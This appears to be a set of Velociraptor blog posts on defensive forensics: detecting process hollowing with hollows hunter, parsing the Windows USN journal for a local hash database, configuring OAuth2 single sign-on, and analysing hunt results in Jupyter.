### Example: Hollows hunter

To illustrate the process, we will use the [hollows hunter tool](https://github.com/hasherezade/hollows_hunter) as an example. This tool is written by the amazing [HASHEREZADE](https://hasherezade.github.io/) who develops a bunch of useful tools to inspect binaries in memory (most famous is the [pe_sieve](https://github.com/hasherezade/pe-sieve) tool).

We would like to develop a Velociraptor artifact that collects all processes potentially injected by using the hollows hunter on the endpoint. Before we start though, we need to actually have such a sample to test on.

Thanks to the Atomic Red Team we can use a simple test to inject a dll into notepad++. I will use the test for [T1055](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.md#atomic-test-1---process-injection-via-mavinjectexe) to inject the dll into *notepad++.exe* on my test VM (which has the Process ID 4108):

![](../../img/1E6SBS406C2B-3BVVJ10Sig.png)

Now we can check that hollows hunter detects this:

![](../../img/1wt1KqixkeSs8Ael96fpAXA.png)

### Writing the artifact

We now create the artifact in the Velociraptor GUI. Start off by selecting the *“View Artifacts”* pane in the left sidebar and click the* “New Artifact”* button to bring up the artifact editor UI. The editor will have a pre-filled in template which helps to guide the user to produce the correct syntax so I will just edit that.

![](../../img/1s9fGjhLnwf2uW4vRt3qCQA.png)

The first thing I will do is name the artifact *“Custom.Windows.Detection.ProcessHollowing”*. Since this is a custom artifact, it must start with the word **Custom. **to keep it distinct from Velociraptor’s built in artifacts. I can also add a quick description to help users understand what this artifact does.

Next I will declare that this artifact needs the **hollows_hunter** tool. Velociraptor will ensure this tool is available on the endpoint when the artifact is collected. The tool’s name is simply a string that I will use to refer to the tool below. It will be automatically added to Velociraptor’s inventory of external tools.

By providing the url, Velociraptor can fetch the tool by itself from this URL. If the tool is not yet known to Velociraptor, the server will fetch the file and calculate the hash the first time and store it. In the next section we can see how to manage tools in Velociraptor.

Now we are ready to write the VQL that will use the tool. The VQL will run on the endpoint during collection and will need a valid path to the hollows hunter executable. Velociraptor will manage uploading the executable to the endpoint and caching the binary locally, ensuring its hash does not change over time. To make this process as easy to use as possible, as far as the artifact writer is concerned, they simply need to call the *“Generic.Utils.FetchBinary()”* artifact to get a path to the local binary.

![](../../img/1WWMvYGQvreCfPbKrtDYuew.png)

The first VQL query simply calls the **Generic.Utils.FetchBinary()** artifact with the required tool name (Note that we don't need to specify a url since this is already known to the system). We assign the result of this query to the *“binaries”* variable — which will contain an array of rows as is always the case with assigning a query to a variable (in this case only one row).

At the same time we also obtain a temporary directory to store results in. This directory will be automatically removed when the query ends to clean up.

Next we call the binary using the **execve()** plugin with the appropriate arguments — We wish to dump the memory of affected processed and write json results into the temp directory (The length parameter forces the execve() plugin to wait until the buffer is full before emitting the row — this will wait until the program is done and emit a single row with Stdout as a column.)

After the hollows hunter program ends, we glob over all the files in the temp directory and just upload them to the server (we chain the two queries together using the *chain()* plugin).

The complete artifact can be seen below:

<script src="https://gist.github.com/scudette/0f5d5102b6e3b1580b4feccdf7d59b53.js" charset="utf-8"></script>

### Collecting from the endpoint

Now let's test this artifact by collecting it from our test VM. Simply search for the hostname in the search box, and view the* “Collected Artifacts”* pane to see previously collected artifacts. Click the *“Collect new artifacts”* button and search for our newly created hollows hunter artifact.

![](../../img/1iTGEgzlLFnoQpwwLBTylQg.png)

Click* “Launch Collection” *to collect it from the endpoint. We can view the query log as it is executing on the endpoint to really appreciate what is happening behind the scenes.

![](../../img/1uf7vfDoXWEUYO6KOabXHtw.png)

The endpoint initially does not have a copy of the hollows hunter binary cached locally, so it needs to download it. The endpoint will now sleep a random time before actually downloading it in order to stagger downloads from potentially thousands of endpoints in a hunt.

After a short sleep, the endpoint will download the binary directly from GitHub, it will then calculate the hash of the binary it downloaded with the expected hash that was sent by the server. If the hashes match, then the endpoint will keep this file in the temp directory. The hash comparison protects endpoints from the GitHub binary changing unexpectedly.

Finally, the endpoint simply runs the tool, and uploads the results to the server.

![](../../img/15U_9frnLTdA1vsyPuewh4g.png)

The user can access those results as normally by simply getting the results in a zip file from the **Artifact Collection** tab.

![](../../img/1G9m-FkIBjgzQh1xURAnpzw.png)

We can now also hunt for this on our entire fleet to retrieve all the injected binaries in minutes!

Note that once the binary is cached on the endpoint, the Velociraptor client will not need to download it again, as long as the cached hash matches the expected hash.

### Tool support — deep dive

In the above example, from the point of view of the artifact writer, the hollows hunter binary just magically appeared on the endpoint when it was required by an artifact that used it. How does this actually work?

Velociraptor has integrated support for external tools since 0.4.6. The tools are managed by the velociraptor tools command. You can see what tools Velociraptor knows about using the **velociraptor tools show** command:

![](../../img/1y0ApRgFzYELr7A2Ko4AHNQ.png)

We can see that Velociraptor knows the hash of the hollows hunter tool and it also keeps a copy of the binary in the filestore under a special obfuscated name.

### Using a custom tool

Previously we have seen that the endpoints all downloaded the hollows hunter binary directly from GitHub. In practice, if you have thousands of clients all trying to download the same binary in a hunt it might trigger GitHub’s DDoS protections. At larger scale it might be better to serve binaries from more reliable source, like cloud buckets or Velociraptor’s server itself.

Suppose we also wanted to use a special version of hollows_hunter (perhaps an unreleased version with extra features or detections) so we would really like to host the binary ourselves.

We can directly upload our custom version to Velociraptor using the **velociraptor tools upload** command

![](../../img/1cQ-vwx6uj3JSavrF5m5ejQ.png)

Velociraptor will now serve the binary from the frontends directly when used (seen by the serve_locally flag). Note that the binary will still only be downloaded if the local copy on the endpoint does not have the required hash so if this is a frequently used tool it will generally not generate a lot of download traffic.

### Conclusions

The aim of the new tool integration is to have Velociraptor automatically manage local caching on the endpoint of external files. It is possible to have the endpoints download the files from any URL, or serve it locally from Velociraptor itself. Either way, Velociraptor ensures the file integrity by specifying in the collection request the required file hash.

Although in this example we used a binary on the endpoint, this is not necessary. The scheme works just as well with any file type. For example, sysmon configuration files can also be kept in a central place and artifacts can sync them on the endpoint and load them as required.

The ability to resync tools on the endpoint opens the door to versioned files. For example, we frequently use Yara rule files containing frequently changing signatures from threat feeds and other intel. By updating the hashes on the Velociraptor server we can force endpoints to use the latest version of the signatures whenever an artifact is run, but only if they don't already have the latest pack of yara rules (which may be large).

Caching the files locally means the overheads of downloading the file each time is eliminated, the artifact YAML itself contains all one needs to collect this specific type of evidence. In the above example, we can collect the hollows hunter multiple times, but the binary will only be actually downloaded once per endpoint. The next collection will simply use the same local binary while its hash is not changed.

To play with this new feature yourself, take Velociraptor for a spin! It is a available on [GitHub](https://github.com/Velocidex/velociraptor) under and open source license. As always please file issues on the bug tracker or ask questions on our mailing list [velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com) . You can also chat with us directly on discord [https://www.velocidex.com/discord](../../img/discord)

---END OF FILE---

======
FILE: /content/blog/2020/2020-11-13-the-windows-usn-journal-f0c55c9010e/_index.md
======
---
title: The Windows USN Journal
description: Digging up Window’s juicy secrets…
tags:
- Forensics
- Windows
- USN
date: '2020-11-12T00:38:44.349Z'
categories: []
keywords: []
---

![](../../img/1Nv0e89B_XOhBSxpY2v9Z8g.png)

*Thanks to [Matt Green ](https://twitter.com/mgreen27)for discussions, ideas and code….*

NTFS is the default filesystem on Windows systems, so it is important for DFIR tools to support extracting as much system state information as possible from it. Velociraptor already has a full featured [NTFS parser](https://www.velocidex.com/blog/medium/2019-11-15_recovering-deleted-ntfs-files-with-velociraptor-1fcf09855311/), and in a recent release (0.5.2) also added a parser for the **USN Journal** (Update Sequence Number Journal), or [Change Journal](https://en.wikipedia.org/wiki/USN_Journal).

### What is the USN Journal?

By default Windows maintains a journal of filesystem activities in a file called **$Extend\$UsnJrnl** in a special data stream called **$J**. This stream contains records of filesystem operations, primarily to allow backup applications visibility into the files that have been changed since the last time a backup was run.

The **$Extend\$UsnJrnl:$J** file begins life when the volume is created as an empty file. As files are modified on the volume, the $J file is extended with additional USN records.

In order to preserve space, the NTFS creators use an ingenious trick: The beginning of the file is erased and made into a sparse run. Since NTFS can handle sparse files (i.e. files with large runs containing no data) efficiently, the file effectively does not consume any more disk space than needed but does not need to be rotated or truncated and can just seem to grow infinitely.

This means that in practice we find the **$J** file on a live system reporting a huge size (sometimes many hundreds of gigabytes!), however usually the start of the file is sparse and takes no disk space, so the $J file typically only consumes around 30–40mb of actual disk space. This is illustrated in the diagram below.

![](../../img/1oh4ARro_MayRRUZAJHqhaw.png)

USN Records are written back to back within the file. The USN records contain[ valuable information](https://docs.microsoft.com/en-us/windows/win32/api/winioctl/ns-winioctl-usn_record_v2):

* The USN ID is actually the offset of the record within the file. This is a unique ID of the USN record (since the file is never truncated).

* A Timestamp — This is a timestamp for the file modification

* Reason — is the reason of this modification for example DATA_TRUNCATION, DATA_EXTEND, FILE_CREATE, FILE_DELETE etc.

* Filename is the name of the file that is being affected.

* Parent MFT ID points to the parent record within the MFT (the changed file’s containing directory).

Using the Filename and Parent MFT ID allows Velociraptor to resolve the full path of the file from the root of the filesystem.

### Velociraptor’s USN Parser

Velociraptor provides access to the USN parser via the **parse_usn()** plugin. Let’s see what kind of data this plugin provides by running a simple query in the notebook

![](../../img/1JkUkNsAJWFjP9uzwf56Jig.png)

In the above I hid some of the less interesting fields, but we can immediately see the USN records are shown with their USN ID (which is the offset in the $J file), the timestamp, the full path to the modified file and the reasons for modifications.

When a program interacts with a file, we typically see a bunch of related filesystem events. For example, I can create a new file called **test.txt** using notepad and write some data into it. I can then query the USN journal for modifications to that file (The **=~** operator is VQL’s regex match)…

![](../../img/1gB2SCYCpK5xLceNH_OhhZg.png)

Notepad seems to interact with the file using a number of separate operations and this adds several events into the USN journal file for the same interaction.

Previously, Velociraptor was able to only collect the USN journal file and users had to rely on other third party tools to parse it (e.g. [this](https://tzworks.net/prototype_page.php?proto_id=5) or [this](https://github.com/PoorBillionaire/USN-Journal-Parser)). The problem with that approach is that external tools usually have no access to the original $MFT and therefore were unable to resolve the parent MFT id in the USN record to a full path. Parsing the USN records directly on the endpoint allows Velociraptor to immediately resolve the files into a full path making analysis much easier later.

### When to use the USN Journal?

The USN journal can provide visibility into filesystem activity going back quite a long time. It seems that Windows aims to keep the maximum actual size of the log file around 30–40mb (remember, the file is sparse) so if the machine is not used too heavily, we sometimes find the log goes back a week or two. This gives us visibility on past system activity.

Practically this can be useful:

* When a program is run, typically we can see the prefetch files modified which gives us a timestamp on execution (in the case where the prefetch files themselves were deleted).

* One can see file modification or creation of a particular file extension (e.g. executables) or within specific directories (e.g. Windows\System32\) which might indicate system compromise took place.

* Many compromises occur after an initial file based malware was run (e.g. office macros, or PDF). The USN journal can provide a time of initial infection.

* The USN journal can provide evidence of deleted files. With Velociraptor it is possible to efficiently hunt for all machines that had the particular file in the recent past — even if the file was subsequently deleted. This is useful to find evidence of attacker toolkit installation, or initial vectors of compromise.

### Watching the USN journal

In the previous section we saw how Velociraptor can parse the USN journal on a running system, enabling hunting and analysis of past filesystem activity.

However, Velociraptor is built around VQL — a unique query language allowing for asynchronous and event driven queries. Therefore, Velociraptor also has the unique ability to create event queries — queries that never terminate, but process data as it occurs.

As such, Velociraptor offers many event driven versions of the standard plugins. For USN Journals, Velociraptor offers the **watch_usn()** plugin as an event driven alternative to the **parse_usn()** plugin. When a query uses **watch_usn()**, Velociraptor will watch the USN log for new entries, and as they appear, the plugin will release the event into the rest of the query.

This allows Velociraptor to watch for file changes in near real time on the running system. You can easily see this effect by running an event query from the command line:

![](../../img/1kVFXU7krriNv2m1srYsTWg.png)

As filesystem changes occur they are picked up by the **watch_usn()** plugin and reported a short time later. This allows us to write queries that respond to filesystem events in near real time.

### Event monitoring example: Hash database

Having the ability for Velociraptor to actively watch for filesystem events in near real time opens the door for many potential applications. One very useful application is maintaining a local hash database on endpoints.

Hunting for a file hash on endpoints can be a very useful technique. While attackers can and do change their tools trivially to make hunting for file hash ineffective, once a specific compromise is detected, being able to rapidly hunt for the same hash across the entire fleet can reveal other compromised hosts.

Up until now, hunting for hashes on a machine was difficult and resource intensive. This is because trying to determine if any files exist on an endpoint having a given hash requires hashing all the files and comparing their hash to the required hash — so essentially hashing every file on the system!

Even after reasonable optimizations around file size, modification time ranges, file extensions etc, a hunt for hashes is quite resource intensive, and therefore used sparingly.

The ability to follow the USN journal changes all that. We can simply watch the filesystem for changes, and when a file is modified, we can hash it immediately and store the hash locally in a database on the endpoint itself. Then later we can simply query that database rapidly for the presence of the hash.

![](../../img/1v8WrntHsWl3XbrDZ1yFuDw.png)

As mentioned in the previous section, a single change typically involves several USN log entries. We therefore need to deduplicate these changes. We simply need to know that a particular file may have changed recently (say in the last few minutes) and we can then rehash it and update the database accordingly.

All this can easily be implemented using a VQL query, which we can store in a VQL artifact. You can see the **Windows.Forensics.LocalHashes.Usn** [full artifact source here](https://github.com/Velocidex/velociraptor/blob/master/artifacts/definitions/Windows/Forensics/LocalHashes/Usn.yaml).

In order to get this query to run on the endpoints, we assign the artifact as a client event detection artifact, by clicking the “Client Events” screen and then the “Update Client monitoring table” button. After selecting the label group to apply to (All will apply this to all machines in your deployment), simply add the **Windows.Forensics.LocalHashes.Usn** artifact by searching for it.

![](../../img/1ebbAwSff_9QqhbQqfMThnA.png)

The most important configuration parameter is the PathRegex specifying which files we should be watching. For example, you might only be interested in hashes of executables or word documents. Leaving the setting at “.” will match any file, including very frequently used files like event logs and databases — this setting can potentially affect performance. Finally you can suppress the artifact output if you like — this just means that hashes will not be additionally reported to the Velociraptor server. They will just be updating the local database instead.

Once the query is deployed it will run on all endpoints and start feeding hash information to the server (if required). You can see this information in the client monitoring screen by simply selecting the artifact and choosing a day of interest

![](../../img/1CIoyTKKFshUGoHFlS4zx5A.png)

You can now easily page through the data viewing the hashes and files that were added since the query started. You can also download the entire SQLite database file from the endpoint, or watch the events on the server for specific file types or hashes found across the entire deployment.

![](../../img/17fRC-jlP_4VxarLtqfhtMQ.png)

Let’s test querying this local database. I will just pick a random
hash and see if my endpoint has this hash. I will simply collect the
Windows.Forensics.LocalHashes.Query artifact on my endpoint and
configure it to search for the hash
`f4065c7516d47e6cb5b5f58e1ddd1312`. This hash can be entered as a
table in the GUI or simply as a comma delimited text field.

![](../../img/17SU9muB1xlvOuwZ-AGxkPQ.png)

The artifact returns almost instantly with the file that this hash belongs to

![](../../img/1Wprj9Wic03bIg-86ClDBtg.png)

The local hash database is simply a SQLite file maintained by the VQL query. As such I can easily collect this file with a hunt if I wanted to archive the hash database periodically from all my endpoints.

Collecting the **Windows.Forensics.LocalHashes.Glob** artifact will populate the local hash database by simply crawling a directory, hashing all files inside it and populated the database — this is useful to pre-populate the database with hashes of files created before Velociraptor was installed.

### Conclusion

Velociraptor brings unprecedented visibility to endpoint machine states using state of the art forensic capabilities. In this post we saw how parsing the USN Journal allows Velociraptor to gather information about past filesystem activity. We also saw how detection and monitoring queries can be used to respond to file modification or creation in near real time.

Finally we saw this capability put into practice by maintaining a local hash database which can be queried on demand to quickly answer questions like *which machine in my fleet contain this hash?*

To play with this new feature yourself, take Velociraptor for a spin! It is a available on [GitHub](https://github.com/Velocidex/velociraptor) under an open source license. As always please file issues on the bug tracker or ask questions on our mailing list [velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com) . You can also chat with us directly on discord [https://www.velocidex.com/discord](https://www.velocidex.com/discord)

---END OF FILE---

======
FILE: /content/blog/2020/2020-08-17-velociraptor-sso-authentication-6dd68d46dccf/_index.md
======
---
title: Velociraptor SSO Authentication
description: Protect your Velociraptor with OAuth2
date: '2020-08-16T01:38:44.349Z'
tags:
- Integration
- Authentication
categories: []
keywords: []
---

![](../../img/1LYHMWBm-PIb4rrMurPgAUA.png)

The Velociraptor GUI allows administrators and DFIR team members to rapidly respond and hunt across their entire deployment in seconds. This is a powerful capability, and must be adequately protected.

### Modes of authentication

Velociraptor supports two modes of authentication:

1. Basic authentication

1. Single Sign On using third party OAuth2 logon flow.

In the basic authentication mode, GUI users are added by the administrator and given passwords. When a user logs into the GUI, their browser prompts them to enter a username and password, and the password hashes are checked against those hashes stored in the database.

This traditional authentication flow is simple to use and implement but has a number of shortfalls — the main one being that the user needs to remember yet another password for Velociraptor and so they are likely to reuse an existing password. Modern secure applications also use 2 factor authentication as an additional security mechanism with potentially complex authentication schemes (e.g. secure token).

### OAuth2 flow

Velociraptor supports delegating the authentication to an identity provider (Currently Github, Microsoft or Google and potentially many others in future). This means that Velociraptor never gets to see a user’s password or actually logs them in at all — Velociraptor relies on the OAuth2 provider to assert that the user authenticated correctly (and potentially used the required 2FA method). There are many resources about OAuth2 for example t[his](https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2) or the [RFC6749](https://tools.ietf.org/html/rfc6749) also has a lot of details.

While the OAuth2 protocol allows an application to request access to different resources owned by the user, Velociraptor only requests basic access to their email address — Velociraptor associates ACL policies with the user’s email address.

The following steps are performed to log a user into the Velociraptor GUI:

1. The User’s browser makes a request to the Velociraptor GUI

1. Velociraptor redirects the browser to the OAuth2 provider (e.g. Google)

1. The user logs on to their provider and receives a consent screen asking them if they wish to authorize Velociraptor to receive their email address.

1. Once the user authorizes the app, the OAuth2 provider redirects back to the Velociraptor **callback URL **with a token. The callback URL is the path location within the Velociraptor App that will handle the incoming token.

1. At this point Velociraptor already knows the user’s email address and can log them in, as long as they have sufficient permissions (The Velociraptor [ACL model](https://www.velocidex.com/blog/medium/2020-03-29-velociraptors-acl-model-7f497575daee/) still applied).

The advantage of this scheme is that Velociraptor never handles user passwords, and additional authentication requirements like 2FA can be imposed by the OAuth2 provider.

### Google OAuth2

Velociraptor previously [only supported Google ](https://www.velocidex.com/blog/html/2018/12/23/deploying_velociraptor_with_oauth_sso.html)as an OAuth2 provider. However this recently changed when new providers were added.

This post outlines the process of setting up OAuth2 authentication for both GitHub and Microsoft O365 environments.

### GitHub OAuth2 flow

Setting up a Github OAuth2 application is detailed in [their extensive developer docs](https://docs.github.com/en/developers/apps/creating-an-oauth-app), so I will not repeat it here. I will just include a screenshot of the final screen. For this example I will set up one of our training VMs:

![](../../img/1V0SFCRyBB3EgaTnRGEvbvg.png)

The most important item in this form is the Authorization callback URL, which must be of the form

```
https://public DNS name/auth/github/callback
```

Once I click Register Application, Github will provide me with a client id and a client secret — Those are used by Velociraptor to send authorization requests to Github for authentication.

![](../../img/1ZU-eolQPeo8inmTfq4VkVA.png)

Now that we have the client id and secret we can create our configuration file using the interactive config generator
```sh
velociraptor.exe config generate -i
```

![](../../img/1yJ7sIPl_qnL9UUrJvNZJLA.png)

Be sure to enter the proper external DNS name of your Velociraptor server, select **Authenticate users with SSO** and choose **Github** as the provider. Velociraptor will show once again, the correct redirect URL that needs to be entered into the GitHub form as we have seen above.

Finally enter the Github client ID and secret and create the server config files. To deploy on a typical Debian based VM, simply build the debian package ready to deploy to your server.

![](../../img/19WneTKLF_985TEXYJKcAbQ.png)

I will now push the Debian package to the server and install it using SCP and SSH. When I navigate to the public URL at [https://vm1.training.velocidex.com](https://vm1.training.velocidex.com) I am redirected to Github to authenticate and upon authorizing the app I can log into my Velociraptor server.

![](../../img/1U5rYGAoEkXr1TeQFJ8UDiw.png)

The GitHub OAuth2 flow is excellent! I received an email immediately when my user was authorized and I can see the total number of users authorized to this application.

### Microsoft Azure OAuth2 flow

Many Velociraptor users are using Office 365 and Azure to manage their organizations. I can set up the Microsoft OAuth2 flow in a very similar way to the previous flow. The only main difference with O365 is the concept of tenants — Azure provides each organization with a tenancy which is normally their domain name.

First I will navigate to the Azure Active Directory application and select **App Registrations**. Click on **New registration** to add a new App.

![](../../img/1enBaYt9G2zve-8l6zIbmjw.png)

Now I provide the app with a name. Here I can select if this app should be used by users from different tenants or restricted to my org only.

![](../../img/1EakNAGcDH2r4BEuEQJ0fXA.png)

Finally enter the callback URL as before. Note that this is a different URL because it is using the Azure authenticator within Velociraptor. When submitting this, Azure AD will only create a client ID for our application. We need to manually create the client secret using an additional step in the UI. I will select **Certificate & Secrets** from the menu.

![](../../img/1eWcpTayDUJsCnzmlYk_9pg.png)

Then create a new secret by giving it a name and an expiry.

![](../../img/1gzLxCqvsdJj4hHADofYDLw.png)

Now we have both the client id and secret from the previous screen. We simply need to copy those to the configuration wizard. This time we need to provide the tenant ID as well.

![](../../img/1ivNMZZSw74VsMRCbY43FHw.png)

![](../../img/1fCDpwr3e0HiWscr_6O5cPQ.png)

After installing this server and accessing it with a web browser, the authentication will redirect to Microsoft to authenticate the user.

![](../../img/1R6OYfqhNwABhfkQJQjNlMA.png)

## Conclusions

We have seen how to secure the GUI with the new OAuth2 providers. Having a choice of providers allows different organizations to deploy Velociraptor safely at scale and integrate Velociraptor directly into their enterprise architecture.

Note that OAuth2 is only responsible for authentication — i.e. the user is who they claim to be. It does not automatically grant them any permission within the GUI. If a user does not have a specific ACL record they will be rejected:

![](../../img/18xUczf1PP7eyM9XaBzTBEw.png)

You can assign or delete users using the **velociraptor user add** command. You can also assign roles to users using the **velociraptor acl grant** commands. The configuration wizard offers to provision an initial set of administrator users for smoother install, but you can always add users later using the command line.

If your favorite authentication provider is not yet supported, please file a feature request on our [GitHub](https://github.com/Velocidex/velociraptor) project, or even send us a pull request!

---END OF FILE---

======
FILE: /content/blog/2020/2020-03-06-velociraptor-post-processing-with-jupyter-notebook-and-pandas-8a344d05ee8c/_index.md
======
---
title: Velociraptor Post-processing with Jupyter Notebook and Pandas
description: Making sense of the data…
date: '2020-03-06T00:38:44.349Z'
categories: []
keywords: []
---

![](../../img/11fFaw5h0oG_ICHv7Q7Haog.png?width=600px)

Velociraptor is a powerful endpoint visibility tool. The unique strength of the tool is being able to collect endpoint state by using the Velociraptor Query Language (VQL) via custom or curated “[Artifacts](https://www.velocidex.com/docs/user-interface/artifacts/)”. Not only can one collect artifacts from a single host, but one can collect the same artifact from many thousands of hosts within seconds.

Being able to collect a lot of data quickly is awesome, but the flip side is that a lot of data makes it harder to review manually. We can always tune artifacts by editing the VQL to be more surgical which helps with reducing the collected data, but we would often still like to be able to post process and understand the data we get back in a convenient way.

Velociraptor allows you to download the results of a hunt into a zip file. In the zip file, you can find a combined CSV file containing the results from all endpoints. You can process this file using an external tool or upload to a database.

![](../../img/1q6eE6r23LPXwe0BDbEM4fw.png)

In a [previous article](../2020-01-12_hunting-malware-using-mutants-ea08e86dfc19/) we have seen how to forward Velociraptor collected data to Elastic and Kibana for post processing. While this is certainly useful, we often want to quickly analyze the data we have and provide a working document of our findings without needing additional infrastructure.

### Jupyter Notebook

[Jupyter notebook](https://jupyter.org/) is an amazing project fusing interactive data analysis and documentation into a single application. A Jupyter notebook consists of a series of cells, each cell can be either markdown formatted text, or a Python code snippet, which gets evaluated and the results are stored in the cell’s output section. The notebook contains the analyst work as they are working and can then be exported as a final report using a variety of formats (pdf, html etc).

The notebook approach is ideal for DFIR investigations. Since we don't typically know what is important when we start our investigation, we go through checking various things and drilling down into various evidence sources. The notebook keeps track of all our work and records our analysis until we narrow down the intrusions, documenting any dead-ends we might encounter and documenting our findings in a logical easy to follow way.

In this article I will show how to use Jupyter to post-process some simple Velociraptor hunts to perform a typical DFIR response.

{{% notice note %}}
Note that while Jupyter and Pandas are both written in Python you do not actually need to know Python to use Jupyter with Velociraptor. Jupyter simply evaluates VQL statements on the Velociraptor server and displays their result in the notebook. Similarly you don't need to be a VQL expert — Event a basic understanding of VQL is sufficient to be able to drill down into the hunt results.
{{% /notice %}}

### Configuring Jupyter access to the Velociraptor Server

In order for Jupyter to connect to the Velociraptor server, we will use the Velociraptor API to issue VQL queries directly on the server.

By default, the server’s API service is not exposed to the internet. We can modify the server’s configuration to allow this by simply changing the API’s bind port to 0.0.0.0

In our example we have an Ubuntu server running Velociraptor in[ the recommended way](https://www.velocidex.com/docs/getting-started/cloud/#deploying-to-the-cloud). When used in this way, Velociraptor runs under a low privilege user account called “velociraptor”.

We therefore need to change to that user, edit the configuration file and restart the service. Finally we check that the service is listening on all interfaces with port 8001.

![](../../img/1d0MOYqBImpL4rfUeaB0mEw.png)

![](../../img/1KcIJClHBVGpJEb7uud9YOw.png)

### Creating an API key

In order to allow access, Velociraptor requires an API key file to be created. This file contains certificates and key material for authenticating an API client with the server. Simply generate a new key and name it with a unique name (In our case we will call the key **Mike**)

![](../../img/1ChgJFdKblfhINrga14RElw.png)

Since release 0.4.0 you will also need to explicitly grant the key query permissions

![](../../img/1ScauB3x9K8eWbKKvoGCv9w.png)

### Installing Jupyter and Pandas

Jupyter and Pandas are written in Python and therefore can be easily installed using the pip package manager that comes with python. We will also use Velociraptor’s python bindings to talk with the server (If you want to plot graphs you will also need to install matplotlib).

```
# pip install pyvelociraptor jupyter pandas
```

![](../../img/1OcyptZNE9dk4N3UEXcbtpQ.png)

Next copy the API key we generated on the server to your workstation and make sure that the api_connection_string is pointing to the server’s public DNS name

![](../../img/1stl9_KDM4aO2TbzyB7h2vg.png)

The easiest way to provide Python programs with the API key is to simply set the path to the key file in the environment variable **VELOCIRAPTOR_API_FILE**. We can then launch the Jupyter notebook.

![](../../img/1ZtI7wXzoUpHX_1A6WKVcUg.png)

This will open the browser and should present the Jupyter web app. We can now create a new notebook using the regular Python3 kernel.

![](../../img/14Q6TJx6GFp8vrhSYjcQNFw.png)

### Running VQL in the notebook

Jupyter notebooks provide cells with input editable areas, where you can write python code. The code will be evaluated when pressing CTRL-Enter and the result is shown in the output part of the cell.

Pandas is a popular data exploration and transformation library which works great with Jupyter. We will use Pandas to explore the result of VQL queries we issue to the server.

To test our connection, we run the simple query “SELECT * FROM info()” which just provides information about the running platform.

<script src="https://gist.github.com/scudette/4db9f8b8c288d7d2650acd4a5908ea9f.js"></script>

If all goes well, the Velociraptor Python bindings will attempt to connect to the server, run the VQL statement on the server and present the results as a table within the notebook.

![](../../img/1zIo1vmWBb8L_5U9LIy0_ag.png)

{{% notice note %}}

NOTE: The VQL queries we issue in the notebook run directly on the server. You can do anything with these queries, including collecting new artifact on any endpoint, starting and stopping hunts and inspecting any collected data. Velociraptor currently does not offer fine grained ACLs — being able to run VQL is effectively the same as having root level access everywhere. Please take care to secure the API key file on your workstation.

{{% /notice %}}

### Using Jupyter to investigate a hunt

With the power of Jupyter and VQL you can do some really sophisticated analysis, but in this section I will just demonstrate a very typical process of drilling into data, including and excluding filters and identifying important trends.

For this example I will schedule a collection of the windows task scheduler files in a hunt. Malware typically installs scheduled tasks to ensure persistence — the task will run at a later time and will guarantee the malware is re-installed.

![We schedule the Windows.System.TaskScheduler hunt to collect and analyze all scheduled tasks.](../../img/1Bs3on9WKi6Jx6qs8kFENEA.png)*We schedule the Windows.System.TaskScheduler hunt to collect and analyze all scheduled tasks.*

In a real investigation, the hunt will collect all the scheduled tasks from thousands of machines, making manual analysis tedious and challenging.

![We can see the hunt id assigned to this hunt. We will need this ID when querying through the API](../../img/1Nu4ZOANqPJYg962prCJtFA.png)*We can see the hunt id assigned to this hunt. We will need this ID when querying through the API*

We start off by exploring the results of the hunt — simply select all columns from the hunt results but limit the result of only a small set for inspection. We will call the [hunt_results](https://www.velocidex.com/docs/vql_reference/server/#hunt-results) VQL plugin and provide it with the hunt id, the artifact we collected and the source in the artifact.

<script src="https://gist.github.com/scudette/e990ca3fafb7302b05c6cf583e89a3a1.js"></script>

It is very important to limit the query otherwise the server will send too many rows and take a long time. If this happens you can select Jupyter’s Kernel->Interrupt menu to abort the query.

![](../../img/1vQXPUJA1ooY_XLhyDhPbOg.png)

The collected hunt contains too many columns for our current purpose, so we simply restrict the columns shown to **FullPath, Command, Arguments and Fqdn.**

![](../../img/1X3HZ0Wi7NTz_ou3Jec2v3A.png)

This looks better!

We know that many malware scheduled tasks tend to run cmd.exe as the command, so we want to only check for tasks running cmd.exe next. We simply add a **WHERE Command =~ ‘cmd.exe’** clause (In VQL =~ is the regex match operator).

![](../../img/1IqVixgwp_kpJufyzf84ylA.png)

After some investigation we determine that the commands running **silcollector** are actually legitimate. Also **dsregcmd.exe** is not related to the malware and is legitimate. Simply add some more filters to exclude those conditions.

![](../../img/11IqgundpX4Mp5Qw__gA4MQ.png)

This isolated the data we actually want. In a large malware infection, we might see many suspicious tasks deployed to many hosts at the same time. We can repeat the process of including, and excluding tasks based on various criteria to get an idea of which machines are compromised.

### Plotting graphs

[Pandas](https://pandas.pydata.org/) also supports plotting graphs through [matplotlib](https://matplotlib.org/). The next VQL snippet simply extracts the kill timestamp (when a flow ended) from a particular hunt to visualize how this hunt actually progressed over time. We can use Pandas to manipulate the timestamps and then plot them into the notebook.

![](../../img/1M_kYmIvuI1bKQahVYlOj5Q.png)

As can be see in the above plot, this particular hunt collected artifacts from about 1750 endpoints within about a minute (collecting the machines currently connected to the server) then as the next few days progressed, more machines came back online completing the collection. Slowly the total number reached gradually the entire fleet.

This graph demonstrates that in practice, while we can query the hunt immediately in order to triage those machines currently online, as machines are added to the hunt over time the hunt’s data is growing and changing.

Jupyter allows each cell to re-run and refresh its output at any time. For important cells we might want to re-run them a few days later to ensure more complete data coverage.

### Conclusions

Jupyter is a great analysis tool because it provides for a way to document our reasoning behind our findings. We can keep a record of all the things we checked, together with the relevant VQL queries. Once complete, the notebook can be exported to HTML for a static view of our findings and can form part of our report.

Through the Velociraptor API we are able to issue VQL queries directly to the server. This avoids having to export data, move it to another system, insert into another database and then query it. The query will always access the latest data available on the server.

Although Velociraptor might feel a little like a database as we query it to post process hunts, it does not actually maintain any indexes. This means that each query, Velociraptor is effectively doing a full row scan on the entire hunt result. This can get quite slow for artifacts that collect huge amounts of data. However, in practice we tend to collect surgical artifacts with a relatively small data set by selecting pre-filters within the client side artifacts. There is a tradeoff between being surgical in collection and managing large data sets in post processing.

If you see yourself executing a lot of queries repeatedly on the same dataset it is probably faster to upload it to Elastic. However, in most cases, we simply want to examine one hunt at a time, and triage the results in a fairly rudimentary way, so that row scan is acceptable.

I especially like the Jupyter notebook and intend to write entire reports in it as a way of keeping track of any investigation details and results obtained.

